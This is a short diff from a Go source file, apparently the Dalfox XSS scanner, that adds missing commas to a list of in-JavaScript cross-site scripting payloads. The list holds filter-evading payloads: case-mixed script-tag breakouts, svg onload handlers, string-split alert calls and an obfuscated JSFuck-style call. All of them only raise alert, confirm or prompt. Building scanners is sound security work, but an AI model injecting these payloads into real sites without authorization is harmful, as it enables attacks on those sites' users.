@@ -253,9 +253,9 @@ func getInJsPayload(ip string) []string {
 		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
 		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
 		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
-		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>"
-		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>"
-		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>"
+		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
+		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
+		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
 		"window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
 		"this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
 		"self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
